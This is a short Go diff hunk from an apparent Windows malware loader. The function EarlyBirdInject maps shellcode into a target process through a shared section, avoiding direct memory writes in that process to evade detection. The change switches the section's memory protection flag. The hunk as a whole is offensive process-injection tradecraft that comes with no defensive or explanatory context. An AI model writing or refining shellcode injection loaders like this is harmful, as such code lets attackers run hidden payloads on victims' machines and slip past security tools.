@@ -57,7 +57,7 @@ func EarlyBirdInject(sc []byte, host string) error {
 	}
 
 	// ── Map shellcode via shared section (no WriteVM in target) ───────────
-	hSection := NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	hSection := NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_WRITECOPY)
 	if hSection == 0 {
 		cleanup()
 		return fmt.Errorf("NtCreateSection failed")
